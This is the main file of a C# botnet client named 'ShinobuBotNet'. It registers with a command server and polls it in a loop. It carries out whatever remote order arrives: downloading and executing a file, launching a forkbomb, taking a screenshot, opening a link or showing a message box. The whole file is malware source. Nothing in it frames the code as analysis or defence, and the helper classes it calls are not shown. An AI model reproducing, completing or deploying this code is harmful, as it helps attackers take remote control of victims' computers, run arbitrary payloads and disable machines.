using System;
using System.Text.RegularExpressions;
using System.Threading;
using System.Net;
using System.Threading.Tasks;
using System.Windows;

namespace ShinobuBotNet
{
    class cMain
    {
        static string last_cmd = string.Empty;

        static void Main(string[] args)
        {
            if (System.IO.File.Exists("c0n0ct.ch"))
            {
                while (true)
                {
                    string id = API.Get_ID();
                    string html = API.GetCommand(id);
                    if(html == "null")
                    {
                        continue;
                    }

                    if (last_cmd == html)
                    {
                        Thread.Sleep(configs.delay);
                        continue;
                    }
                    last_cmd = html;

                    cmd command = new cmd(html);
                    Execute(command);

                    Thread.Sleep(configs.delay);
                }
            }



            else
            {
                API.creat_cheak_File();
                API.connect();

                while (true)
                {
                    string id = API.Get_ID();
                    string html = API.GetCommand(id);
                    if (html == "null")
                    {
                        continue;
                    }

                    if (last_cmd == html)
                    {
                        Thread.Sleep(configs.delay);
                        continue;
                    }
                    last_cmd = html;

                    cmd command = new cmd(html);
                    Execute(command);

                    Thread.Sleep(configs.delay);
                }
            }
        }


        static void Execute(cmd CMD)
        {
            switch (CMD.ComType)
            {
                case "open_link":
                    functions.OpenLink(CMD.ComContent);
                    break;

                case "download_execute":
                    functions.DownloadExecute(CMD.ComContent);
                    break;

                case "exit":
                    Environment.Exit(0);
                    break;

                case "ping":
                    functions.ping();
                    break;

                case "forkbomb":
                    functions.forkbomb();
                    break;

                case "screnshot":
                    functions.screenshot();
                    break;

                case "msg_box":
                    functions.MSG(CMD.ComContent);
                    break;
            }
        }
    }
}
